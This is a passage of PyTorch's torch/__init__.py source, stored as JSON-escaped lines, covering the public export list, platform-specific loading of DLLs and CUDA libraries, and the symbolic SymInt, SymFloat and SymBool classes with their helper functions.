      "    \"DoubleTensor\",\n",
      "    \"FloatStorage\",\n",
      "    \"FloatTensor\",\n",
      "    \"GradScaler\",\n",
      "    \"IntStorage\",\n",
      "    \"IntTensor\",\n",
      "    \"LongStorage\",\n",
      "    \"LongTensor\",\n",
      "    \"ShortStorage\",\n",
      "    \"ShortTensor\",\n",
      "    \"SymBool\",\n",
      "    \"SymFloat\",\n",
      "    \"SymInt\",\n",
      "    \"Tensor\",\n",
      "    \"TypedStorage\",\n",
      "    \"UntypedStorage\",\n",
      "    \"are_deterministic_algorithms_enabled\",\n",
      "    \"autocast\",\n",
      "    \"chunk\",\n",
      "    \"compile\",\n",
      "    \"cond\",\n",
      "    \"enable_grad\",\n",
      "    \"export\",\n",
      "    \"get_default_device\",\n",
      "    \"get_deterministic_debug_mode\",\n",
      "    \"get_device_module\",\n",
      "    \"get_float32_matmul_precision\",\n",
      "    \"get_rng_state\",\n",
      "    \"inference_mode\",\n",
      "    \"initial_seed\",\n",
      "    \"is_deterministic_algorithms_warn_only_enabled\",\n",
      "    \"is_storage\",\n",
      "    \"is_tensor\",\n",
      "    \"is_warn_always_enabled\",\n",
      "    \"load\",\n",
      "    \"lobpcg\",\n",
      "    \"manual_seed\",\n",
      "    \"matmul\",\n",
      "    \"no_grad\",\n",
      "    \"rand\",\n",
      "    \"randn\",\n",
      "    \"save\",\n",
      "    \"seed\",\n",
      "    \"set_default_device\",\n",
      "    \"set_default_tensor_type\",\n",
      "    \"set_deterministic_debug_mode\",\n",
      "    \"set_float32_matmul_precision\",\n",
      "    \"set_printoptions\",\n",
      "    \"set_rng_state\",\n",
      "    \"set_warn_always\",\n",
      "    \"split\",\n",
      "    \"stack\",\n",
      "    \"sym_float\",\n",
      "    \"sym_fresh_size\",\n",
      "    \"sym_int\",\n",
      "    \"sym_ite\",\n",
      "    \"sym_max\",\n",
      "    \"sym_min\",\n",
      "    \"sym_not\",\n",
      "    \"sym_sum\",\n",
      "    \"typename\",\n",
      "    \"unravel_index\",\n",
      "    \"use_deterministic_algorithms\",\n",
      "    \"vmap\",\n",
      "]\n",
      "\n",
      "# Please keep this list sorted\n",
      "assert __all__ == sorted(__all__)\n",
      "\n",
      "################################################################################\n",
      "# Load the extension module\n",
      "################################################################################\n",
      "\n",
      "if sys.platform == \"win32\":\n",
      "\n",
      "    def _load_dll_libraries() -> None:\n",
      "        import sysconfig\n",
      "\n",
      "        from torch.version import cuda as cuda_version\n",
      "\n",
      "        pfiles_path = os.getenv(\"ProgramFiles\", r\"C:\\Program Files\")\n",
      "        py_dll_path = os.path.join(sys.exec_prefix, \"Library\", \"bin\")\n",
      "        th_dll_path = os.path.join(os.path.dirname(__file__), \"lib\")\n",
      "        usebase_path = os.path.join(\n",
      "            sysconfig.get_config_var(\"userbase\"), \"Library\", \"bin\"\n",
      "        )\n",
      "\n",
      "        # When users create a virtualenv that inherits the base environment,\n",
      "        # we will need to add the corresponding library directory into\n",
      "        # DLL search directories. Otherwise, it will rely on `PATH` which\n",
      "        # is dependent on user settings.\n",
      "        if sys.exec_prefix != sys.base_exec_prefix:\n",
      "            base_py_dll_path = os.path.join(sys.base_exec_prefix, \"Library\", \"bin\")\n",
      "        else:\n",
      "            base_py_dll_path = \"\"\n",
      "\n",
      "        dll_paths = [\n",
      "            p\n",
      "            for p in (th_dll_path, py_dll_path, base_py_dll_path, usebase_path)\n",
      "            if os.path.exists(p)\n",
      "        ]\n",
      "\n",
      "        if not builtins.any(\n",
      "            os.path.exists(os.path.join(p, \"nvToolsExt64_1.dll\")) for p in dll_paths\n",
      "        ):\n",
      "            nvtoolsext_dll_path = os.path.join(\n",
      "                os.getenv(\n",
      "                    \"NVTOOLSEXT_PATH\",\n",
      "                    os.path.join(pfiles_path, \"NVIDIA Corporation\", \"NvToolsExt\"),\n",
      "                ),\n",
      "                \"bin\",\n",
      "                \"x64\",\n",
      "            )\n",
      "        else:\n",
      "            nvtoolsext_dll_path = \"\"\n",
      "\n",
      "        if cuda_version and builtins.all(\n",
      "            not glob.glob(os.path.join(p, \"cudart64*.dll\")) for p in dll_paths\n",
      "        ):\n",
      "            cuda_version_1 = cuda_version.replace(\".\", \"_\")\n",
      "            cuda_path_var = \"CUDA_PATH_V\" + cuda_version_1\n",
      "            default_path = os.path.join(\n",
      "                pfiles_path, \"NVIDIA GPU Computing Toolkit\", \"CUDA\", f\"v{cuda_version}\"\n",
      "            )\n",
      "            cuda_path = os.path.join(os.getenv(cuda_path_var, default_path), \"bin\")\n",
      "        else:\n",
      "            cuda_path = \"\"\n",
      "\n",
      "        dll_paths.extend(\n",
      "            p for p in (nvtoolsext_dll_path, cuda_path) if os.path.exists(p)\n",
      "        )\n",
      "\n",
      "        kernel32 = ctypes.WinDLL(\"kernel32.dll\", use_last_error=True)\n",
      "        with_load_library_flags = hasattr(kernel32, \"AddDllDirectory\")\n",
      "        prev_error_mode = kernel32.SetErrorMode(0x0001)\n",
      "\n",
      "        kernel32.LoadLibraryW.restype = ctypes.c_void_p\n",
      "        if with_load_library_flags:\n",
      "            kernel32.LoadLibraryExW.restype = ctypes.c_void_p\n",
      "\n",
      "        for dll_path in dll_paths:\n",
      "            os.add_dll_directory(dll_path)\n",
      "\n",
      "        try:\n",
      "            ctypes.CDLL(\"vcruntime140.dll\")\n",
      "            ctypes.CDLL(\"msvcp140.dll\")\n",
      "            if platform.machine() != \"ARM64\":\n",
      "                ctypes.CDLL(\"vcruntime140_1.dll\")\n",
      "        except OSError:\n",
      "            print(\n",
      "                textwrap.dedent(\n",
      "                    \"\"\"\n",
      "                    Microsoft Visual C++ Redistributable is not installed, this may lead to the DLL load failure.\n",
      "                    It can be downloaded at https://aka.ms/vs/16/release/vc_redist.x64.exe\n",
      "                    \"\"\"\n",
      "                ).strip()\n",
      "            )\n",
      "\n",
      "        dlls = glob.glob(os.path.join(th_dll_path, \"*.dll\"))\n",
      "        path_patched = False\n",
      "        for dll in dlls:\n",
      "            is_loaded = False\n",
      "            if with_load_library_flags:\n",
      "                res = kernel32.LoadLibraryExW(dll, None, 0x00001100)\n",
      "                last_error = ctypes.get_last_error()\n",
      "                if res is None and last_error != 126:\n",
      "                    err = ctypes.WinError(last_error)\n",
      "                    err.strerror += (\n",
      "                        f' Error loading \"{dll}\" or one of its dependencies.'\n",
      "                    )\n",
      "                    raise err\n",
      "                elif res is not None:\n",
      "                    is_loaded = True\n",
      "            if not is_loaded:\n",
      "                if not path_patched:\n",
      "                    os.environ[\"PATH\"] = \";\".join(dll_paths + [os.environ[\"PATH\"]])\n",
      "                    path_patched = True\n",
      "                res = kernel32.LoadLibraryW(dll)\n",
      "                if res is None:\n",
      "                    err = ctypes.WinError(ctypes.get_last_error())\n",
      "                    err.strerror += (\n",
      "                        f' Error loading \"{dll}\" or one of its dependencies.'\n",
      "                    )\n",
      "                    raise err\n",
      "\n",
      "        kernel32.SetErrorMode(prev_error_mode)\n",
      "\n",
      "    _load_dll_libraries()\n",
      "    del _load_dll_libraries\n",
      "\n",
      "\n",
      "def _preload_cuda_deps(lib_folder: str, lib_name: str) -> None:\n",
      "    \"\"\"Preloads cuda deps if they could not be found otherwise.\"\"\"\n",
      "    # Should only be called on Linux if default path resolution have failed\n",
      "    assert platform.system() == \"Linux\", \"Should only be called on Linux\"\n",
      "\n",
      "    lib_path = None\n",
      "    for path in sys.path:\n",
      "        nvidia_path = os.path.join(path, \"nvidia\")\n",
      "        if not os.path.exists(nvidia_path):\n",
      "            continue\n",
      "        candidate_lib_paths = glob.glob(\n",
      "            os.path.join(nvidia_path, lib_folder, \"lib\", lib_name)\n",
      "        )\n",
      "        # if path/nvidia/lib_folder/ is not found look in path/lib_folder/\n",
      "        if not candidate_lib_paths:\n",
      "            candidate_lib_paths = glob.glob(\n",
      "                os.path.join(path, lib_folder, \"lib\", lib_name)\n",
      "            )\n",
      "\n",
      "        if candidate_lib_paths and not lib_path:\n",
      "            lib_path = candidate_lib_paths[0]\n",
      "        if lib_path:\n",
      "            break\n",
      "    if not lib_path:\n",
      "        raise ValueError(f\"{lib_name} not found in the system path {sys.path}\")\n",
      "    ctypes.CDLL(lib_path)\n",
      "\n",
      "\n",
      "# See Note [Global dependencies]\n",
      "def _load_global_deps() -> None:\n",
      "    if _running_with_deploy() or platform.system() == \"Windows\":\n",
      "        return\n",
      "\n",
      "    # Determine the file extension based on the platform\n",
      "    lib_ext = \".dylib\" if platform.system() == \"Darwin\" else \".so\"\n",
      "    lib_name = f\"libtorch_global_deps{lib_ext}\"\n",
      "    here = os.path.abspath(__file__)\n",
      "    global_deps_lib_path = os.path.join(os.path.dirname(here), \"lib\", lib_name)\n",
      "\n",
      "    try:\n",
      "        ctypes.CDLL(global_deps_lib_path, mode=ctypes.RTLD_GLOBAL)\n",
      "        # Workaround slim-wheel CUDA dependency bugs in cusparse and cudnn by preloading nvjitlink\n",
      "        # and nvrtc. In CUDA-12.4+ cusparse depends on nvjitlink, but does not have rpath when\n",
      "        # shipped as wheel, which results in OS picking wrong/older version of nvjitlink library\n",
      "        # if `LD_LIBRARY_PATH` is defined, see https://github.com/pytorch/pytorch/issues/138460\n",
      "        # Similar issue exist in cudnn that dynamically loads nvrtc, unaware of its relative path.\n",
      "        # See https://github.com/pytorch/pytorch/issues/145580\n",
      "        try:\n",
      "            with open(\"/proc/self/maps\") as f:\n",
      "                _maps = f.read()\n",
      "            # libtorch_global_deps.so always depends in cudart, check if its installed via wheel\n",
      "            if \"nvidia/cuda_runtime/lib/libcudart.so\" not in _maps:\n",
      "                return\n",
      "            # If all above-mentioned conditions are met, preload nvrtc and nvjitlink\n",
      "            # Please note that order are important for CUDA-11.8 , as nvjitlink does not exist there\n",
      "            _preload_cuda_deps(\"cuda_nvrtc\", \"libnvrtc.so.*[0-9]\")\n",
      "            _preload_cuda_deps(\"nvjitlink\", \"libnvJitLink.so.*[0-9]\")\n",
      "        except Exception:\n",
      "            pass\n",
      "\n",
      "    except OSError as err:\n",
      "        # Can only happen for wheel with cuda libs as PYPI deps\n",
      "        # As PyTorch is not purelib, but nvidia-*-cu12 is\n",
      "        cuda_libs: _Dict[str, str] = {\n",
      "            \"cublas\": \"libcublas.so.*[0-9]\",\n",
      "            \"cudnn\": \"libcudnn.so.*[0-9]\",\n",
      "            \"cuda_nvrtc\": \"libnvrtc.so.*[0-9]\",\n",
      "            \"cuda_runtime\": \"libcudart.so.*[0-9]\",\n",
      "            \"cuda_cupti\": \"libcupti.so.*[0-9]\",\n",
      "            \"cufft\": \"libcufft.so.*[0-9]\",\n",
      "            \"curand\": \"libcurand.so.*[0-9]\",\n",
      "            \"nvjitlink\": \"libnvJitLink.so.*[0-9]\",\n",
      "            \"cusparse\": \"libcusparse.so.*[0-9]\",\n",
      "            \"cusparselt\": \"libcusparseLt.so.*[0-9]\",\n",
      "            \"cusolver\": \"libcusolver.so.*[0-9]\",\n",
      "            \"nccl\": \"libnccl.so.*[0-9]\",\n",
      "            \"nvtx\": \"libnvToolsExt.so.*[0-9]\",\n",
      "        }\n",
      "        is_cuda_lib_err = [\n",
      "            lib for lib in cuda_libs.values() if lib.split(\".\")[0] in err.args[0]\n",
      "        ]\n",
      "        if not is_cuda_lib_err:\n",
      "            raise err\n",
      "        for lib_folder, lib_name in cuda_libs.items():\n",
      "            _preload_cuda_deps(lib_folder, lib_name)\n",
      "        ctypes.CDLL(global_deps_lib_path, mode=ctypes.RTLD_GLOBAL)\n",
      "\n",
      "\n",
      "if (USE_RTLD_GLOBAL_WITH_LIBTORCH or os.getenv(\"TORCH_USE_RTLD_GLOBAL\")) and (\n",
      "    _running_with_deploy() or platform.system() != \"Windows\"\n",
      "):\n",
      "    # Do it the hard way.  You might want to load libtorch with RTLD_GLOBAL in a\n",
      "    # few circumstances:\n",
      "    #\n",
      "    #   1. You're in a build environment (e.g., fbcode) where\n",
      "    #      libtorch_global_deps is not available, but you still need\n",
      "    #      to get mkl to link in with RTLD_GLOBAL or it will just\n",
      "    #      not work.\n",
      "    #\n",
      "    #   2. You're trying to run PyTorch under UBSAN and you need\n",
      "    #      to ensure that only one copy of libtorch is loaded, so\n",
      "    #      vptr checks work properly\n",
      "    #\n",
      "    # If you're using this setting, you must verify that all the libraries\n",
      "    # you load consistently use the same libstdc++, or you may have\n",
      "    # mysterious segfaults.\n",
      "    #\n",
      "    old_flags = sys.getdlopenflags()\n",
      "    sys.setdlopenflags(os.RTLD_GLOBAL | os.RTLD_LAZY)\n",
      "\n",
      "    from torch._C import *  # noqa: F403\n",
      "\n",
      "    sys.setdlopenflags(old_flags)\n",
      "    del old_flags\n",
      "\n",
      "else:\n",
      "    # Easy way.  You want this most of the time, because it will prevent\n",
      "    # C++ symbols from libtorch clobbering C++ symbols from other\n",
      "    # libraries, leading to mysterious segfaults.\n",
      "    #\n",
      "    # If building in an environment where libtorch_global_deps isn't available\n",
      "    # like parts of fbsource, but where RTLD_GLOBAL causes segfaults, you will\n",
      "    # want USE_RTLD_GLOBAL_WITH_LIBTORCH = False and USE_GLOBAL_DEPS = False\n",
      "    #\n",
      "    # See Note [Global dependencies]\n",
      "    if USE_GLOBAL_DEPS:\n",
      "        _load_global_deps()\n",
      "    from torch._C import *  # noqa: F403\n",
      "\n",
      "\n",
      "class SymInt:\n",
      "    \"\"\"\n",
      "    Like an int (including magic methods), but redirects all operations on the\n",
      "    wrapped node. This is used in particular to symbolically record operations\n",
      "    in the symbolic shape workflow.\n",
      "    \"\"\"\n",
      "\n",
      "    def __init__(self, node):\n",
      "        # This field MUST be named node; C++ binding code assumes that this\n",
      "        # class has a field named node that stores SymNode\n",
      "        self.node = node\n",
      "\n",
      "    def __bool__(self):\n",
      "        return builtins.bool(self != 0)\n",
      "\n",
      "    def __int__(self):\n",
      "        return self.node.int_()\n",
      "\n",
      "    def __index__(self):\n",
      "        return self.node.int_()\n",
      "\n",
      "    # Magic methods installed by torch.fx.experimental.sym_node\n",
      "\n",
      "    def __round__(self, ndigits=None):\n",
      "        return self\n",
      "\n",
      "    def __truediv__(self, other):\n",
      "        if isinstance(other, (builtins.float, SymFloat)):\n",
      "            return sym_float(self).__float_truediv__(other)\n",
      "        if not isinstance(other, (builtins.int, SymInt)):\n",
      "            return NotImplemented\n",
      "        return self.__int_truediv__(other)\n",
      "\n",
      "    def __rtruediv__(self, other):\n",
      "        if isinstance(other, (builtins.float, SymFloat)):\n",
      "            return sym_float(self).__rfloat_truediv__(other)\n",
      "        if not isinstance(other, (builtins.int, SymInt)):\n",
      "            return NotImplemented\n",
      "        return self.__rint_truediv__(other)\n",
      "\n",
      "    def __floordiv__(self, other):\n",
      "        if isinstance(other, (builtins.float, SymFloat)):\n",
      "            return sym_float(math.floor(sym_float(self) / other))\n",
      "        if not isinstance(other, (builtins.int, SymInt)):\n",
      "            return NotImplemented\n",
      "        return self.__int_floordiv__(other)\n",
      "\n",
      "    def __rfloordiv__(self, other):\n",
      "        if isinstance(other, (builtins.float, SymFloat)):\n",
      "            return sym_float(math.floor(other / sym_float(self)))\n",
      "        if not isinstance(other, (builtins.int, SymInt)):\n",
      "            return NotImplemented\n",
      "        return self.__rint_floordiv__(other)\n",
      "\n",
      "    # nb: complex is impossible to handle correctly lol, with\n",
      "    # negative base and integral float need to diverge semantics and\n",
      "    # just always return complex.  Neener neener pretend this problem\n",
      "    # doesn't exist\n",
      "    def __pow__(self, other):\n",
      "        if isinstance(other, (builtins.float, SymFloat)):\n",
      "            return sym_float(self).__pow__(other)\n",
      "        if not isinstance(other, (builtins.int, SymInt)):\n",
      "            return NotImplemented\n",
      "        # Guards!  This guard is necessary because we need to know it to\n",
      "        # determine the output type of this operation\n",
      "        if other >= 0:\n",
      "            return self.__pow_by_natural__(other)\n",
      "        else:\n",
      "            # Mercifully, when the exponent is negative, Python just promotes\n",
      "            # to doubles and does a float pow:\n",
      "            #\n",
      "            #   if (Py_SIZE(b) < 0 && c == NULL) {\n",
      "            #       /* if exponent is negative and there's no modulus:\n",
      "            #              return a float.  This works because we know\n",
      "            #              that this calls float_pow() which converts its\n",
      "            #              arguments to double. */\n",
      "            #       Py_DECREF(a);\n",
      "            #       Py_DECREF(b);\n",
      "            #       return PyFloat_Type.tp_as_number->nb_power(v, w, x);\n",
      "            #   }\n",
      "            return sym_float(self).__pow__(sym_float(other))\n",
      "\n",
      "    def __rpow__(self, other):\n",
      "        if isinstance(other, (builtins.float, SymFloat)):\n",
      "            return sym_float(self).__rpow__(other)\n",
      "        if not isinstance(other, (builtins.int, SymInt)):\n",
      "            return NotImplemented\n",
      "        if self >= 0:  # self is exponent\n",
      "            return self.__rpow_by_natural__(other)\n",
      "        else:\n",
      "            return sym_float(self).__rpow__(sym_float(other))\n",
      "\n",
      "    def __eq__(self, other: object) -> builtins.bool:\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __lt__(self, other) -> builtins.bool:\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __gt__(self, other) -> builtins.bool:\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __le__(self, other) -> builtins.bool:\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __ge__(self, other) -> builtins.bool:\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __add__(self, other) -> \"SymInt\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __radd__(self, other) -> \"SymInt\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __rmul__(self, other) -> \"SymInt\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __mod__(self, other: \"IntLikeType\") -> \"SymInt\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __mul__(self, other) -> \"SymInt\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __pow_by_natural__(self, other) -> \"SymInt\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __rpow_by_natural__(self, other) -> \"SymInt\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __int_truediv__(self, other) -> \"SymFloat\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __rint_truediv__(self, other) -> \"SymFloat\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __int_floordiv__(self, other) -> \"SymFloat\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __rint_floordiv__(self, other) -> \"SymFloat\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __sym_max__(self, other):\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __sym_min__(self, other):\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __sym_float__(self):\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __neg__(self):\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __sub__(self, other: \"IntLikeType\") -> \"SymInt\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __rsub__(self, other: \"IntLikeType\") -> \"SymInt\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __and__(self, other) -> \"SymInt\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __or__(self, other) -> \"SymInt\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __repr__(self):\n",
      "        return self.node._graph_repr()\n",
      "\n",
      "    def _sympy_(self):\n",
      "        return self.node.expr\n",
      "\n",
      "    def __hash__(self) -> builtins.int:\n",
      "        if self.node.is_nested_int():\n",
      "            return hash(self.node.nested_int())\n",
      "        else:\n",
      "            # We could support constant SymInts as well, but not doing it for now\n",
      "            raise TypeError(\"unhashable type: non-nested SymInt\")\n",
      "            # TODO: Force specialization\n",
      "            # This can't be done because the TypeError here is load bearing\n",
      "            # for einops\n",
      "            # https://github.com/arogozhnikov/einops/blob/6181e1e95dc58c00a3143c1726da1c6ee0463164/einops/einops.py#L237\n",
      "            # return hash(builtins.int(self))\n",
      "\n",
      "    def as_integer_ratio(self) -> _Tuple[\"SymInt\", builtins.int]:\n",
      "        \"\"\"Represent this int as an exact integer ratio\"\"\"\n",
      "        return self, 1\n",
      "\n",
      "    def bit_length(self) -> builtins.int:\n",
      "        # TODO: A more relaxed guard is possible here, where you guard to\n",
      "        # allow all integer quantities which would result in the same bit\n",
      "        # length.  We can also just make a dedicated Sympy function for\n",
      "        # computing this quantity and represent it symbolically.\n",
      "        return builtins.int(self).bit_length()\n",
      "\n",
      "    def conjugate(self) -> \"SymInt\":\n",
      "        return self\n",
      "\n",
      "\n",
      "class SymFloat:\n",
      "    \"\"\"\n",
      "    Like an float (including magic methods), but redirects all operations on the\n",
      "    wrapped node. This is used in particular to symbolically record operations\n",
      "    in the symbolic shape workflow.\n",
      "    \"\"\"\n",
      "\n",
      "    def __init__(self, node):\n",
      "        # This field MUST be named node; C++ binding code assumes that this\n",
      "        # class has a field named node that stores SymNode\n",
      "        self.node = node\n",
      "\n",
      "    def __truediv__(self, other):\n",
      "        if not isinstance(other, (builtins.int, builtins.float, SymInt, SymFloat)):\n",
      "            return NotImplemented\n",
      "        return self.__float_truediv__(sym_float(other))\n",
      "\n",
      "    def __rtruediv__(self, other):\n",
      "        if not isinstance(other, (builtins.int, builtins.float, SymInt, SymFloat)):\n",
      "            return NotImplemented\n",
      "        return self.__rfloat_truediv__(sym_float(other))\n",
      "\n",
      "    def __floordiv__(self, other):\n",
      "        if not isinstance(other, (builtins.int, builtins.float, SymInt, SymFloat)):\n",
      "            return NotImplemented\n",
      "        return sym_float(math.floor(self / sym_float(other)))\n",
      "\n",
      "    def __rfloordiv__(self, other):\n",
      "        if not isinstance(other, (builtins.int, builtins.float, SymInt, SymFloat)):\n",
      "            return NotImplemented\n",
      "        return sym_float(math.floor(sym_float(other) / self))\n",
      "\n",
      "    def __bool__(self):\n",
      "        return self.node.bool_()\n",
      "\n",
      "    def __float__(self):\n",
      "        return self.node.guard_float(\"\", 0)\n",
      "\n",
      "    # Symbolic power does NOT work with negative base, this is to avoid\n",
      "    # potential complex outputs\n",
      "    def __pow__(self, other):\n",
      "        if not isinstance(other, (builtins.int, builtins.float, SymInt, SymFloat)):\n",
      "            return NotImplemented\n",
      "        torch._check(self >= 0)\n",
      "        return self.__float_pow__(other)\n",
      "\n",
      "    def __rpow__(self, other):\n",
      "        if not isinstance(other, (builtins.int, builtins.float, SymInt, SymFloat)):\n",
      "            return NotImplemented\n",
      "        torch._check(other >= 0)\n",
      "        return self.__rfloat_pow__(other)\n",
      "\n",
      "    # Magic methods installed by torch.fx.experimental.sym_node\n",
      "\n",
      "    def __eq__(self, other: object) -> builtins.bool:\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __lt__(self, other) -> builtins.bool:\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __gt__(self, other) -> builtins.bool:\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __le__(self, other) -> builtins.bool:\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __ge__(self, other) -> builtins.bool:\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __float_pow__(self, other) -> \"SymFloat\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __rfloat_pow__(self, other) -> \"SymFloat\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __float_truediv__(self, other) -> \"SymFloat\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __rfloat_truediv__(self, other) -> \"SymFloat\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __trunc__(self):\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __sym_max__(self, other):\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __sym_min__(self, other):\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __sym_int__(self):\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def is_integer(self):\n",
      "        \"\"\"Return True if the float is an integer.\"\"\"\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def as_integer_ratio(self) -> _Tuple[builtins.int, builtins.int]:\n",
      "        \"\"\"Represent this float as an exact integer ratio\"\"\"\n",
      "        return builtins.float(self).as_integer_ratio()\n",
      "\n",
      "    def __repr__(self):\n",
      "        return self.node._graph_repr()\n",
      "\n",
      "    def _sympy_(self):\n",
      "        return self.node.expr\n",
      "\n",
      "    def __hash__(self):\n",
      "        return hash(builtins.float(self))\n",
      "\n",
      "    def conjugate(self) -> \"SymFloat\":\n",
      "        \"\"\"Returns the complex conjugate of the float.\"\"\"\n",
      "        return self\n",
      "\n",
      "    def hex(self) -> str:\n",
      "        \"\"\"Returns the hexadecimal representation of the float.\"\"\"\n",
      "        return self.node.guard_float(\"\", 0).hex()\n",
      "\n",
      "\n",
      "class SymBool:\n",
      "    \"\"\"\n",
      "    Like an bool (including magic methods), but redirects all operations on the\n",
      "    wrapped node. This is used in particular to symbolically record operations\n",
      "    in the symbolic shape workflow.\n",
      "\n",
      "    Unlike regular bools, regular boolean operators will force extra guards instead\n",
      "    of symbolically evaluate.  Use the bitwise operators instead to handle this.\n",
      "    \"\"\"\n",
      "\n",
      "    def __init__(self, node):\n",
      "        # This field MUST be named node; C++ binding code assumes that this\n",
      "        # class has a field named node that stores SymNode\n",
      "        self.node = node\n",
      "\n",
      "    def __bool__(self):\n",
      "        return self.node.bool_()\n",
      "\n",
      "    def __int__(self):\n",
      "        return builtins.int(self.node.bool_())\n",
      "\n",
      "    # Magic methods installed by torch.fx.experimental.sym_node\n",
      "    def __and__(self, other) -> \"SymBool\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __or__(self, other) -> \"SymBool\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    # We very carefully define __sym_not__, and not a number of other\n",
      "    # plausible alternatives:\n",
      "    #\n",
      "    #   - We do not override __not__ because this is not a real magic\n",
      "    #     method; you cannot override the meaning of the not builtin in\n",
      "    #     Python.  We use the name 'sym_not' to clarify that in user code you\n",
      "    #     cannot use the builtin not or operator.not_ or operator.__not__ and\n",
      "    #     hit this magic method; you must use our custom sym_not operator.\n",
      "    #\n",
      "    #   - We do not override the __invert__ method because SymBool is\n",
      "    #     meant to be usable in situations where bool is expected.  However,\n",
      "    #     bitwise negation ~a does the wrong thing with booleans (because\n",
      "    #     bool is a subclass of int, so ~1 = -2 which is not falseish.)\n",
      "    #     This would be a giant footgun, so we get around it by defining\n",
      "    #     our own operator.  Note that bitwise and/or do the right thing,\n",
      "    #     so we reuse the conventional operators there for readability.\n",
      "    #\n",
      "    def __sym_not__(self) -> \"SymBool\":\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __sym_ite__(self, then_val, else_val):\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __eq__(self, other) -> builtins.bool:\n",
      "        raise TypeError(\"type stub not overridden\")\n",
      "\n",
      "    def __repr__(self):\n",
      "        return self.node._graph_repr()\n",
      "\n",
      "    def _sympy_(self):\n",
      "        return self.node.expr\n",
      "\n",
      "    def __hash__(self):\n",
      "        if self.node.is_constant():\n",
      "            return hash(self.node.bool_())\n",
      "        else:\n",
      "            # Force specialization\n",
      "            return hash(builtins.bool(self))\n",
      "\n",
      "\n",
      "def sym_not(a):\n",
      "    r\"\"\"SymInt-aware utility for logical negation.\n",
      "\n",
      "    Args:\n",
      "        a (SymBool or bool): Object to negate\n",
      "    \"\"\"\n",
      "    import sympy\n",
      "\n",
      "    if overrides.has_torch_function_unary(a):\n",
      "        return overrides.handle_torch_function(sym_not, (a,), a)\n",
      "    if hasattr(a, \"__sym_not__\"):\n",
      "        return a.__sym_not__()\n",
      "    if isinstance(a, sympy.Basic):\n",
      "        return ~a  # type: ignore[operator]\n",
      "    return not a\n",
      "\n",
      "\n",
      "def sym_float(a):\n",
      "    r\"\"\"SymInt-aware utility for float casting.\n",
      "\n",
      "    Args:\n",
      "        a (SymInt, SymFloat, or object): Object to cast\n",
      "    \"\"\"\n",
      "    if overrides.has_torch_function_unary(a):\n",
      "        return overrides.handle_torch_function(sym_float, (a,), a)\n",
      "    if isinstance(a, SymFloat):\n",
      "        return a\n",
      "    elif hasattr(a, \"__sym_float__\"):\n",
      "        return a.__sym_float__()\n",
      "    return builtins.float(a)  # type: ignore[operator]\n",
      "\n",
      "\n",
      "def sym_int(a):\n",
      "    r\"\"\"SymInt-aware utility for int casting.\n",
      "\n",
      "    Args:\n",
      "        a (SymInt, SymFloat, or object): Object to cast\n",
      "    \"\"\"\n",
      "    if overrides.has_torch_function_unary(a):\n",
      "        return overrides.handle_torch_function(sym_int, (a,), a)\n",
      "    if isinstance(a, SymInt):\n",
      "        return a\n",
      "    elif isinstance(a, SymFloat):\n",
      "        return math.trunc(a)\n",
      "    return builtins.int(a)  # type: ignore[operator]\n",
      "\n",
      "\n",
      "def sym_max(a, b):\n",
      "    \"\"\"\n",
      "    SymInt-aware utility for max which avoids branching on a < b.\n",
      "    Unlike builtins.max(), this only works for int/float, and it always\n",
      "    promotes to float if any argument is float (unlike builtins.max, which\n",
      "    will faithfully preserve the type of the input argument).\n",
      "    \"\"\"\n",
      "    if overrides.has_torch_function((a, b)):\n",
      "        return overrides.handle_torch_function(sym_max, (a, b), a, b)\n",
